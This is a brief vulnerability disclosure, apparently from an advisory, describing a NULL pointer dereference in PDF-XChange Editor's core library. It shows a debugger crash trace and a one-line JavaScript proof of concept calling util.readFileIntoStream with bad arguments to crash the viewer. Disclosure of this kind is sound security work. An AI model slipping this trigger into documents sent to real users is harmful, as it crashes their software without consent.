The instruction at which the vulnerability occurs is as follows:
```
(5e78.60c8): Access violation - code c0000005 (!!! second chance !!!)
PDFXEditCore_x64!PXV_GetInstance+0x7252e1:
00007fff`bfb855e1 488b08          mov     rcx,qword ptr [rax] ds:00000000`00000000=????????????????
```

When the `util.readFileIntoStream` invocation fails to create a file stream object, the object is not properly initialized and remains in a zeroed state. The use of this uninitialized object leads to a NULL Pointer Dereference.

The PoC is as follows.
```javascript
util.readFileIntoStream([], 65535)
```
